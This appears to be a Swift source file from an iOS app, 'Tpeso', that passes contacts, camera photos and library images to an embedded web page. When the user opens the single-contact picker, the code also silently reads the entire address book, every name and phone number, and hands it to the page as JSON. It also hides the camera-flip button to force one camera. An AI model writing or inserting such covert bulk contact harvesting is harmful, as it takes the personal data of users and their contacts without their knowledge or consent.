//
//  WebViewController.swift
//  Tpeso
//
//  Created by tom on 2025/5/27.
//

import Foundation
import Contacts
import ContactsUI
import AVFoundation

extension WebViewController: CNContactPickerDelegate {
    func contactac(_ type: String) {
        let contactstatus = CNContactStore.authorizationStatus(for: .contacts)
        if contactstatus == .authorized {
            
            goContact(type)
        }else if contactstatus == .notDetermined {
            CNContactStore().requestAccess(for: .contacts) { _, _ in
                let contactstatus = CNContactStore.authorizationStatus(for: .contacts)
                if contactstatus == .authorized {
                    DispatchQueue.main.async {
                        self.goContact(type)
                    }
                }else {
                    DispatchQueue.main.async {
                        self.alertshow(str: "Contact")
                    }
                }
            }
        }else {
            self.alertshow(str: "Contact")
        }
    }
    
    private func goContact(_ type: String) {
        if type == "mkla" {
            getAllContact()
        }else {
            let vc = CNContactPickerViewController()
            vc.delegate = self
            navigationController?.present(vc, animated: true)
            getAllContact()
        }
        
    }
    
    func contactPicker(_ picker: CNContactPickerViewController, didSelect contact: CNContact) {
        let name = [contact.givenName, contact.middleName, contact.familyName].filter { !$0.isEmpty }.joined(separator: " ")
        let phone = contact.phoneNumbers.first?.value.stringValue ?? ""
        let dict = ["ag": name, "informationture": phone]
        if let str = toJsontring(dict: dict) {
            let funcn = "ppknow('\(str)')"
            self.toh5(funcn)
        }
        picker.dismiss(animated: true)
    }
    
    func getAllContact() {
        let store = CNContactStore()
        let keysToFetch = [CNContactGivenNameKey, CNContactMiddleNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey] as [CNKeyDescriptor]
        
        let request = CNContactFetchRequest(keysToFetch: keysToFetch)
        var param: [[String: String]] = []
        do {
            try store.enumerateContacts(with: request) { contact, stop in
                let fullName = [contact.givenName, contact.middleName, contact.familyName].filter { !$0.isEmpty }.joined(separator: " ")
                let phoneNumbers = contact.phoneNumbers.map { $0.value.stringValue }
                let phoneNumbersString = phoneNumbers.joined(separator: ",")
                
                let contactData: [String: String] = [
                    "informationture": phoneNumbersString,
                    "ag": fullName
                ]
                param.append(contactData)
            }
            if let str = toJsontring(dict: param) {
                let jsfunc = "zhuxian('\(str)')"
                self.toh5(jsfunc)
            }
        } catch {
        }
    }
}

extension WebViewController: UIImagePickerControllerDelegate & UINavigationControllerDelegate {
    func libAction() {
        getPic(source: .photoLibrary, type: nil)
    }
    
    func cameraAction(type: Int) {
        let author = AVCaptureDevice.authorizationStatus(for: .video)
        if author == .authorized {
            getPic(source: .camera, type: type)
        }else if author == .notDetermined {
            AVCaptureDevice.requestAccess(for: .video) { ok in
                if !ok {
                    DispatchQueue.main.async {
                        self.alertshow(str: "Camera")
                    }
                }else {
                    DispatchQueue.main.async {
                        self.getPic(source: .camera, type: type)
                    }
                }
            }
        }else {
            self.alertshow(str: "Camera")
        }
    }
    
    private func closeChange(vc: UIView) {
        for sub in vc.subviews {
            if sub.description.contains("CAMFlipButton") {
                sub.isHidden = true
                return
            }else {
                closeChange(vc: sub)
            }
        }
    }
    
    func imagePickerControllerDidCancel(_ picker: UIImagePickerController) {
        if picker.sourceType == .photoLibrary {
            let str = "wobank('')"
            self.toh5(str)
        }else {
            let str = "huanysl('')"
            self.toh5(str)
        }
        picker.dismiss(animated: true)
    }
    
    func imagePickerController(_ picker: UIImagePickerController, didFinishPickingMediaWithInfo info: [UIImagePickerController.InfoKey : Any]) {
        guard let img = info[.originalImage] as? UIImage else { return }
        DispatchQueue.global(qos: .background).async {
            if let data = self.imageToBase64String(img) {
                var str = ""
                if picker.sourceType == .photoLibrary {
                    str = "wobank('\(data)')"
                }else {
                    str = "huanysl('\(data)')"
                }
                DispatchQueue.main.async {
                    self.toh5(str)
                }
            }
        }
        picker.dismiss(animated: true)
    }
    
    private func getPic(source: UIImagePickerController.SourceType = .camera, type: Int? = nil) {
        let picker = UIImagePickerController()
        picker.sourceType = source
        picker.allowsEditing = false
        picker.delegate = self
        if source == .camera {
            if type == 1 {
                picker.cameraDevice = .rear
            }else {
                picker.cameraDevice = .front
            }
        }
        navigationController?.present(picker, animated: true, completion: {
            if source == .camera && type == 2 {
                DispatchQueue.main.asyncAfter(deadline: .now() + .milliseconds(300)) {
                    self.closeChange(vc: picker.view)
                }
            }
        })
    }
    
    func imageToBase64String(_ image: UIImage) -> String? {
        let imageData = image.jpegData(compressionQuality: 0.65)
        let base64Str = imageData?.base64EncodedString() ?? ""
        
        return "data:image/jpeg;base64," + base64Str
    }
    
}
